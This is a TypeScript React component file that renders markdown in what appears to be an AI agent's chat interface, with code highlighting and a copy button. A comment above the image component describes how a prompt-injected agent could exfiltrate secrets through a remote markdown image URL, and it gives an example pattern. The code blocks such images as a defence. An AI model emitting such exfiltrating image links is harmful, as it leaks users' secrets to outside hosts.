"use client";

import { isValidElement, memo, useEffect, useState, type ReactNode } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { Check, Copy, ImageOff } from "lucide-react";

function textOf(node: ReactNode): string {
  if (node == null || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (isValidElement(node)) return textOf((node.props as { children?: ReactNode }).children);
  return "";
}

// shiki is ~1MB of grammars — keep it out of the main bundle; the first code
// block pulls the chunk, subsequent highlights reuse the cached singleton.
let shikiHtml: ((code: string, lang: string) => Promise<string>) | null = null;
let shikiErr = false;
async function highlight(code: string, lang: string): Promise<string | null> {
  if (shikiErr) return null;
  try {
    if (!shikiHtml) {
      const { codeToHtml } = await import("shiki");
      // both palettes as CSS variables — globals.css picks one per theme,
      // so a theme switch needs no re-highlight
      const themes = { light: "github-light-default", dark: "github-dark-default" };
      shikiHtml = (c, l) =>
        codeToHtml(c, { lang: l, themes, defaultColor: false }).catch(() => {
          // unknown language → plain pre
          return codeToHtml(c, { lang: "text", themes, defaultColor: false });
        });
    }
    return await shikiHtml(code, lang);
  } catch {
    shikiErr = true;
    return null;
  }
}

function CodeBlock({ children }: { children?: ReactNode }) {
  const [copied, setCopied] = useState(false);
  const [html, setHtml] = useState<string | null>(null);
  const cls = isValidElement(children)
    ? ((children.props as { className?: string }).className ?? "")
    : "";
  const lang = /language-(\w+)/.exec(cls)?.[1] ?? "";
  const code = textOf(children).replace(/\n$/, "");

  useEffect(() => {
    let cancelled = false;
    void highlight(code, lang).then((h) => !cancelled && h && setHtml(h));
    return () => {
      cancelled = true;
    };
  }, [code, lang]);

  const copy = () => {
    void navigator.clipboard.writeText(code).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <div className="codeblock">
      <div className="codeblock-head">
        <span className="mono">{lang || "text"}</span>
        <button onClick={copy} className="flex items-center gap-1 hover:text-white">
          {copied ? <Check size={11} /> : <Copy size={11} />}
          {copied ? "Copied" : "Copy"}
        </button>
      </div>
      {html ? (
        // shiki output — generated from `code`, not user-supplied markup
        <div className="shiki-wrap" dangerouslySetInnerHTML={{ __html: html }} />
      ) : (
        <pre>{children}</pre>
      )}
    </div>
  );
}

/** Remote images in agent-written markdown are an exfiltration channel —
 *  a prompt-injected `![](https://host/?d=<secret>)` would fire the moment
 *  it renders. Only inline (data:/blob:) and same-origin images render;
 *  anything else becomes a link the user opens deliberately (the CSP's
 *  img-src blocks it inline anyway). */
export function MarkdownImage({ src, alt }: { src?: unknown; alt?: string }) {
  const url = typeof src === "string" ? src : "";
  let remote: URL | null = null;
  if (!/^(data:image\/|blob:)/i.test(url)) {
    try {
      const u = new URL(url, window.location.href);
      if (u.origin !== window.location.origin) remote = u;
    } catch {
      return <span className="text-(--color-faint)">[image]</span>;
    }
  }
  if (!remote) {
    // eslint-disable-next-line @next/next/no-img-element
    return <img src={url} alt={alt ?? ""} className="max-w-full rounded" />;
  }
  return (
    <a
      href={remote.href}
      target="_blank"
      rel="noreferrer"
      title={remote.href}
      className="inline-flex items-center gap-1.5 max-w-full px-2 py-1 my-0.5 rounded border border-(--color-border2) bg-(--color-panel2) text-2xs text-(--color-dim) no-underline align-middle"
    >
      <ImageOff size={12} className="shrink-0" />
      <span className="truncate">{alt || "Remote image"}</span>
      <span className="shrink-0 text-(--color-faint)">· {remote.host}</span>
    </a>
  );
}

/** Shared markdown renderer: GFM + code blocks with lang label, copy button and
 *  lazy shiki highlighting; links open in a new tab. Memoized — react-markdown
 *  re-parses on every render, and streaming updates would otherwise re-parse
 *  every sibling message each chunk. */
export default memo(function Markdown({ children }: { children: string }) {
  return (
    <div className="md">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          pre: (p) => <CodeBlock>{p.children}</CodeBlock>,
          a: (p) => <a {...p} target="_blank" rel="noreferrer" />,
          img: (p) => <MarkdownImage src={p.src} alt={p.alt} />,
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
});
